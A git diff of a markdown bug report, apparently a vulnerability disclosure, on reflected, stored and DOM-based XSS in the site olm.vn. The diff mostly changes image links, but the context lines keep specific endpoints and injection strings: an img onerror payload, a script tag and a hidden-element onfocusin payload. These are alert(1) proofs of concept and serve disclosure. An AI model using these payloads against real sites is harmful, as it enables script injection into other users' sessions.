@@ -1,4 +1,4 @@
-# Reflected XSS + DOM Based XSS(Clickjacking) + Stored XSS (BONUS $$$)
+# Reflected XSS + DOM XSS(Clickjacking) + Stored XSS (BONUS $$$)
 
 
 
@@ -9,7 +9,7 @@ Endpoint : https://olm.vn/lop-3/[xss bypass]
 
 Inject : ```"123=123><img%20src/onerror=alert(1)>123123```
 
-![](/Reflected_XSS.jpg)
+![](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/olm/image/Reflected.png?raw=true)
 
 
 
@@ -19,7 +19,7 @@ Endpoint : https://olm.vn/?g=classes.checkuser
 
 Inject : ```<script>alert(1)</script>```
 
-![](/Stored.jpg)
+![](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/olm/image/Stored.png?raw=true)
 
 
 ## DOM Based XSS(Clickjacking)
@@ -34,4 +34,4 @@ Inject : ```'id=x tabindex=1 onfocusin=alert(1) style=color:white;top:-1000px;z-
 
 Khi nạn nhân ấn vào bất kỳ đâu ở web thì sẽ bị xss
 
-![](/Clickjacking.jpg)
+![](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/olm/image/Clickjacking.png?raw=true)
